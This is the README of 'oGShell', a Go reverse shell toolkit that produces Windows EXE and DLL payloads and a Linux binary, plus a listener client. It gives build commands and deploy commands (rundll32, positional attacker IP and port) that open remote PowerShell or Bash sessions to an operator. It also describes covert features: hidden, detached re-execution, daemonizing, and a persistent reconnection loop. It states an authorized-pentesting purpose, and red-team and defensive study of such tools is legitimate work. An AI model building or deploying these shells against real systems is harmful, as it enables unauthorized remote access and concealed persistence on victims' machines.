# oGShell

A Go reverse shell toolkit made to support EXE, DLL, and Linux binary formats.

---

## About

oGShell is a lightweight, self-contained reverse shell toolkit written in GoLang with no external runtime dependencies. Each target is a standalone binary built from its own main.go. There is no shared library — logic is intentionally kept separate per target to minimize coupling and simplify auditing.

Windows targets deliver a fully interactive PowerShell session over TCP. The DLL and EXE use the Windows ConPTY API to provide a proper pseudo-terminal, giving the operator a true interactive shell experience. The Linux binary spawns an interactive Bash session. For the best experience, use rlwrap with the netcat listener to provide arrow key usage.

All targets implement a reconnection loop: 10-second retry interval, 5-minute deadline from the last successful connection. The deadline resets on each successful connection, allowing indefinite operation as long as the listener reconnects within the window.

The name is a fun play on words.

---

## Purpose

Built for use in **authorized penetration testing engagements** and **learning environments**. Do not use against systems you do not have explicit written permission to test.

---

## Instructions

### Prerequisites

- Go 1.21+
- MinGW cross-compiler (`gcc-mingw-w64-x86-64`) — required only for the DLL build

### DLL

The DLL is loaded into a host process via `rundll32` and establishes a reverse shell with a full ConPTY-backed PowerShell session.
Server IP and Server Port can be hardcoded before the build, provided during execution, or provided as positional arguments

**Build:**

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc \
  go build -buildmode=c-shared -o oGShell.dll cmd/dll/main.go
```

**Deploy:**

```PowerShell/CMD
rundll32 oGShell.dll,oGShell <serverIP> <serverPort>
```

**Notes:**

- If `serverIP`/`serverPort` are left empty at compile time, the DLL waits up to 30 seconds for interactive input before falling back to defaults.
- Requires Windows 10 build 1809 or later for ConPTY. Older systems fall back to direct pipe I/O.
- `rundll32` must be run from a console window for the console attachment to work correctly.

---

### EXE

A standard Windows executable that re-launches itself as a detached, hidden process and pipes PowerShell stdio to the TCP connection.
Server IP and Server Port can be hardcoded before the build, provided during execution, or provided as positional arguments

**Build:**

```bash
GOOS=windows GOARCH=amd64 go build -o oGShell.exe cmd/windows/main.go
```

**Deploy:**

```PowerShell/CMD
oGShell.exe <serverIP> <serverPort>
```

**Notes:**

- On first run the process immediately re-execs itself with `DETACHED_PROCESS` and `HideWindow`, then exits — the visible window disappears before the shell connects.
- No CGo required; the binary is fully portable across Windows versions.

---

### Linux Binary

Spawns an interactive `/bin/bash -i` session and daemonizes by re-executing itself with a sentinel environment variable, detaching from the parent's stdio.
Server IP and Server Port can be hardcoded before the build, provided during execution, or provided as positional arguments

**Build:**

```bash
go build -o oGShell cmd/linux/main.go
```

**Deploy:**

```bash
./oGShell <serverIP> <serverPort>
```

**Notes:**

- Daemonizes automatically — the foreground process exits and the shell continues in the background.
- No external dependencies; statically linkable with `CGO_ENABLED=0`.

---

### Client (WIP)

A custom listener to provide a better terminal and shell emulation. Provides colors, arrow key usage, tab autocomplete, and control+c functionality.

> **Status:** Work in progress.

**Build:**

```bash
go build -o oGShell-client cmd/client/main.go
```

**Run:**

```bash
./oGShell-client <port>
```

**Notes:**

- Listens on `0.0.0.0:<port>` and accepts the first inbound connection.
